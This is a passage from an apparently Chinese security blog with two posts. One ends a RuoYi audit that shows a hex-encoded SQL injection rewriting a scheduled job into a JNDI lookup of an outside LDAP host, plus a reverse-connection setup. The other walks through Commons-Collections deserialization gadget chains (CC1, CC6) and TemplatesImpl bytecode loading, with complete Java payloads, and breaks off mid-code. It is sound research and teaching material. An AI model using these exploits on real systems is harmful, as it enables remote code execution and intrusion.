<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">genTableServiceImpl.createTable(&#x27;UPDATE sys_job SET invoke_target = &#x27;javax.naming.InitialContext.lookup(&#x27;ldap://xcrlginufj.dgrh3.cn&#x27;)&#x27; WHERE job_id = 1;&#x27;)</span><br></pre></td></tr></table></figure>

<p>但会触发黑名单</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87d43a8379.png"  alt="image-20240306222714229"></p>
<p>由于是执行sql语句，直接将value转为16进制即可</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87d74d32b7.png"  alt="image-20240306222803488"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">genTableServiceImpl.createTable(&#x27;UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7863726c67696e75666a2e64677268332e636e2729 WHERE job_id = 1;&#x27;)</span><br></pre></td></tr></table></figure>

<p>可以成功创建</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87da960116.png"  alt="image-20240306222855973"></p>
<p>运行后任务1的<strong>调用目标字符串</strong>也被成功修改</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87e173d364.png"  alt="image-20240306223045794"></p>
<p>紧接着运行任务1</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87e31f2bd0.png"  alt="image-20240306223112608"></p>
<p>接下来谈个计算机</p>
<p>yakit开个反连，配置一下</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87f1921c43.png"  alt="image-20240306223503680"></p>
<p>执行上边的步骤修改任务1，在运行任务1</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87f44e8cdc.png"  alt="image-20240306223547419"></p>
<p><img   src="http://124.71.147.32/uploads/2024/03/06/65e87f0963833.png"  alt="image-20240306223447821"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>碰上前言中说到的事确实感到挺无奈却又无可奈何。也有可能是我能力不够分析有误，如果有问题希望各位师傅及时指正！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://xz.aliyun.com/t/10687" >https://xz.aliyun.com/t/10687<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90" >https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/pursue-security/p/17658404.html#_label1_3" >https://www.cnblogs.com/pursue-security/p/17658404.html#_label1_3<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/10957" >https://xz.aliyun.com/t/10957<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/luelueking/RuoYi-v4.7.8-RCE-POC" >https://github.com/luelueking/RuoYi-v4.7.8-RCE-POC<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>commons-collections总结梳理</title>
    <url>/blog/2024/03/18/240318cc%E9%93%BE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p><code>commons-collections</code>这个包之所有能攒出那么多利⽤链来，除了因为其使⽤量⼤，技术上的原因是其中包含了⼀些可以执⾏任意⽅法的<strong>ransformer</strong>。</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/13/65f18cf81f3e3.png"  alt="image-20240313192439062"></p>
<p>所以，在<code>commons-collections</code>中找Gadget的过 程，实际上可以简化为，找⼀条<strong>从 Serializable#readObject() 到Transformer#transform()</strong> 的调⽤链。</p>
<h2 id="0x02-cc1"><a href="#0x02-cc1" class="headerlink" title="0x02 cc1"></a>0x02 cc1</h2><p>利用版本：CommonsCollections 3.1 - 3.2.1</p>
<p>限制：JDK版本，8u71 版本以下可用</p>
<p>cc1目前流行的两条链子：</p>
<h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readobject()</span><br><span class="line">	TransformedMap.checkSetValue()</span><br><span class="line">		chainedTransformer.transform()</span><br><span class="line">			InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<p>大概分析一下这个流程(逆推):</p>
<p>触发点就在<code>InvokerTransformer.transform()</code>，可以试一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">).transform(r);</span><br></pre></td></tr></table></figure>

<p>但是有一个问题出现了，Runtime是不能序列化的。因为要在java中能序列化的类必须实现一个<code>Serializable</code>接口，但前者并没有。</p>
<p>解决办法：<strong>反射</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethon</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethon);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure>

<p>应该不难看懂，如果反射学的扎实的话。</p>
<p>很明显可以发现这块是一个链式调用，刚好在<code>ChainedTransformer.transform()</code>中可以链式调用<code>Transformer</code>数组</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/13/65f195d600eb2.png"  alt="image-20240313200228575"></p>
<p>加下来构造一个<code>Transformer</code>数组，把<code>InvokerTransformer</code>放入数据中。</p>
<p><code>ChainedTransformer.transform()</code>中会遍历调用<code>Transformer</code>数组的中对象的<code>transform()方法</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] invokerTransformer= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(invokerTransformer).transform(Runtime.class);</span><br></pre></td></tr></table></figure>

<p>目前我们需要找到一个可以调用<code>ChainedTransformer.transform()</code>的地方，并且<code>transform</code>方法中值要可控</p>
<p>这种后我们注意到一个类<code>ConstantTransformer</code>，他的<code>transform</code>方法传入啥返回啥！</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/13/65f19e18d86ac.png"  alt="image-20240313203743304"></p>
<p>so，是不是可以利用一下它来简化一下咱们的链子。</p>
<p>给出Demo，看看大家能不能看懂！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] invokerTransformer= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(invokerTransformer);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里是不是就可以专心的找调用<code>ChainedTransformer.transform()</code>的地方，而不用管值是否可控。</p>
<p>放两张图对比一下：</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/13/65f1a04631916.png"  alt="image-20240313204700998"></p>
<p>接下来就是<code>TransformedMap.checkSetValue()</code>方法调用了前者</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/13/65f1a0bdf35b6.png"  alt="image-20240313204901314"></p>
<p>继续，在<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code>有调用前者</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/13/65f1a1591b0d4.png"  alt="image-20240313205136461"></p>
<p>目前的逻辑应该就很清楚了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AbstractInputCheckedMapDecorator.MapEntry#setValue()</span><br><span class="line">	TransformedMap.checkSetValue()</span><br><span class="line">			chainedTransformer.transform()</span><br><span class="line">				InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<p><code>AbstractInputCheckedMapDecorator</code>这个类</p>
<p>他里边的一个内部类<code>MapEntry</code>调用了<code>setValue</code>方法，然后调用了<code>checkSetValue</code></p>
<p>而且他还是<code>TransformedMap</code>的父类</p>
<p><img   src="http://124.71.147.32/uploads/2023/10/23/653676867ccd5.png"  alt="image-20231023213501908"></p>
<p>下变的目标就是找哪里调用<code>setValue</code>方法了</p>
<p>重点就在于<code>MapEntry</code>，MapEntry在遍历一个集合时指代他的键和值，那是不是我们遍历<code>AbstractInputCheckedMapDecorator</code>，就可以调用到<code>setValue</code>方法</p>
<p>但是又因为历<code>AbstractInputCheckedMapDecorator</code>是<code>TransformedMap</code>的父类</p>
<p>所以我们遍历<code>TransformedMap</code>就可以调用到<code>setValue</code>，测试一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] invokerTransformer= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transform</span> <span class="operator">=</span> (Transformer) <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(invokerTransformer).transform(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>,transform);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;</span><br><span class="line">    entry.setValue(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续找，找一个遍历集合，并且调用<code>setValue</code>方法的地方，最好就是找一个readObject里边调用<code>setValue</code>的地方</p>
<p>刚好就找到了一个<code>AnnotationInvocationHandler</code></p>
<p>不过我们可以看到他前边没有public….这些修饰，是默认权限。所以就只能在<strong>当前类以及同包（package）下的其他类中被访问</strong></p>
<p><img   src="http://124.71.147.32/uploads/2023/10/23/653682873eb80.png"  alt="image-20231023222614379"></p>
<p>所以就要通过反射来调用它</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandler.newInstance(Target.class,transformedMap);</span><br></pre></td></tr></table></figure>

<p>调试发现执行失败，问题就在于<code>AnnotationInvocationHandler.readObject()</code>在调用setValue()之前有两个判断，我们需满足</p>
<p>有一个if语句对var7进行判断，只有在其不是null的时候才会进入里面执行setValue，否则不会进入也就不会触发漏洞。</p>
<p>如何让这个var7不为null呢？这一块我就不详细分析了，还会涉及到Java注释相关的技术。直接给 出两个条件： </p>
<ul>
<li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X  </li>
<li>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</li>
</ul>
<p>我们找到了一个注解Target，它中有一个value()方法</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/13/65f1a8007c775.png"  alt="image-20240313212000090"></p>
<p>为了再满足第二个条件，我需要给Map中放入一个Key是value的元素：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">map.put(&quot;value&quot;,&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>在ysoserial中用到的是LazyMap而不是TransformedMap。其实和我们其那边分析的类似，也都只能在8u71版本下使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">	LazyMap.get()</span><br><span class="line">		chainedTransformer.transform()</span><br><span class="line">			InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<p>上边我们分析的是在<code>TransformedMap.checkSetValue()</code>中调用<code>chainedTransformer.transform()</code>而这条链用的是<code>LazyMap.get()</code></p>
<p>之后就是围绕着<strong>get</strong>方法向上寻找的过程！</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/13/65f1aa3a4d1bc.png"  alt="image-20240313212929709"></p>
<p>最终还是找到了<code>AnnotationInvocationHandler</code>，其中的invoke方法调用了get()</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/13/65f1aae68178a.png"  alt="image-20240313213221677"></p>
<p>如何触发invoke呢？</p>
<p>前边讲过的动态代理，通过代理调用一个对象的方法，就会触发他的invoke</p>
<p>so..懂了吗？没动再拐回去看看代理类吧！</p>
<p>最终的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] invokerTransformer= new Transformer[]&#123;</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = new ChainedTransformer(invokerTransformer);</span><br><span class="line">Map map = new HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(map, transformerChain);</span><br><span class="line">Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor annotationInvocationHandler = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationHandler.setAccessible(true);</span><br><span class="line">InvocationHandler h = (InvocationHandler) annotationInvocationHandler.newInstance(Override.class,lazyMap);</span><br><span class="line">Map myProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, h);</span><br><span class="line">Object o = annotationInvocationHandler.newInstance(Override.class, myProxy);</span><br></pre></td></tr></table></figure>



<h2 id="0x03-cc6"><a href="#0x03-cc6" class="headerlink" title="0x03 cc6"></a>0x03 cc6</h2><p>利用版本：CommonsCollections 3.1 - 3.2.1</p>
<p>限制：可在Java 7和8的⾼版本触发</p>
<p>Java 8u71以后，cc1利⽤链不能再利⽤了，主要原因是 sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了。 </p>
<p>接下来的cc6就是在高版本下的利用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">	tiedMapEntry.hashCode()</span><br><span class="line">		tiedMapEntry.getValue()</span><br><span class="line">			LazyMap.get()</span><br><span class="line">				chainedTransformer.transform()</span><br><span class="line">					InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<p>其实上半段链子还是相同的，cc6就是继续寻找一个调用get()的地方！</p>
<p>在tiedMapEntry.getValue()中调用</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/14/65f1d04fda339.png"  alt="image-20240314001200220"></p>
<p><code>getValue()</code>又在<code>tiedMapEntry</code>类下的<code>tiedMapEntry</code>下的<code>hashCode()</code>中调用</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/14/65f1d0d01245a.png"  alt="image-20240314001408517"></p>
<p>到这块后，不就和前边分析的<code>urldns</code>的链子结合起来了</p>
<p>poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] invokerTransformer= new Transformer[]&#123;</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer transformerChain = new ChainedTransformer(invokerTransformer);</span><br><span class="line">Map map = new HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);</span><br><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(tiedMapEntry,&quot;bbb&quot;);</span><br><span class="line">lazyMap.remove(&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">Class c = LazyMap.class;</span><br><span class="line">Field lazymapF = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">lazymapF.setAccessible(true);</span><br><span class="line">lazymapF.set(lazyMap,transformerChain);</span><br></pre></td></tr></table></figure>

<p>可以看到这个给的poc中多了<code>lazyMap.remove(&quot;aaa&quot;)</code></p>
<p>因为在LazyMap.get()中有个判断，大概就是判断是否包含key</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/14/65f1d991af5dd.png"  alt="image-20240314005130148"></p>
<p>这个可以就是咱创建<code>TiedMapEntry</code>是构造函数传入的。</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/14/65f1d9de927f9.png"  alt="image-20240314005247063"></p>
<p>但是这个map咱也没往里边放数据，为啥判断没成立。</p>
<p>具体的原因就是因为在HashMap的put⽅法中，也有调⽤到 hash(key)，<code>hashMap.put()</code>这步时就已经触发了整条链，产生了一定的影响，所以直接在序列化前把这个key移除掉就OK！</p>
<h2 id="0x04-字节码"><a href="#0x04-字节码" class="headerlink" title="0x04 字节码"></a>0x04 字节码</h2><p>java中类加载就是：加载<code>.class</code> 文件到 JVM 中（在内存中生成一个代表该类的 <code>Class</code> 对象），java的类加载机制是一个很大的话题，这里主要关注一下安全相关！</p>
<p>提到类加载必不可免的要说一下类加载器<strong>ClassLoader</strong></p>
<h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>不管是加载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader#loadClass ---&gt; ClassLoader#findClass ---&gt; ClassLoader#defineClass</span><br></pre></td></tr></table></figure>

<ul>
<li><code>loadClass</code> 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 <code>findClass</code></li>
<li><code>findClass</code> 的作用是根据基础URL指定的方式来加载类的字节码，就像上面说到的，可能会在<br>本地文件系统、jar包或远程http服务器上读取字节码，然后交给 <code>defineClass</code></li>
<li><code>defineClass</code> 的作用是处理前面传入的字节码，将其处理成真正的Java类</li>
</ul>
<p>**真正核心的部分其实是 <code>defineClass</code>**，他决定了如何将一段字节流转变成一个Java类，Java 默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中。</p>
<p>编写一个简单的代码，来演示如何让系统的 defineClass 来直接加载字节码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDefineClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code,<span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ClassLoader.getSystemClassLoader()返回系统的类加载器对象</span></span><br></pre></td></tr></table></figure>

<p>注意：在 <code>defineClass</code> 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造<br>函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中，在 defineClass 时也无法被直接调用到。所以，如果我们要使用 defineClass 在目标机器上执行任意代码，需要想办法调用构造函数。</p>
<p><img   src="http://124.71.147.32/uploads/2024/03/15/65f3e60689b5f.png"  alt="image-20240315140910241"></p>
<p>这里，因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问，不得 不使用反射的形式来调用。 在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我 们常用的一个攻击链 TemplatesImpl 的基石。</p>
<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>因为系统的 <code>ClassLoader#defineClass</code> 是一个保护属性，所以很难直接利用，so需要找到一个调用<code>defineClass()</code>地方。并且可以被直接调用的方法。</p>
<p>这个推导的过程网上挺多的，就不演示了。主要就是从<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader#defineClass</code>到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</code>的一个过程。</p>
<p>需要利用<code>TemplatesImpl</code>加载字节码，需要使用反射设置其三个私有属性：_bytecodes、 _name 、_tfactory</p>
<ul>
<li><code>_name</code>：为任意字符串，只要不是null才可以进入<code>defineTransletClasses()</code></li>
<li><code>_bytecodes</code>：由字节码组成的数组，用来存放恶意代码，其值不能为null</li>
<li><code>_tfactory</code> 需要是一个 <code>TransformerFactoryImpl</code> 对象，因为<code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用<code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错</li>
</ul>
<p>另外<code>TemplatesImpl</code> 中对加载的字节码是有一定要求的：这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object Value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, Value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span 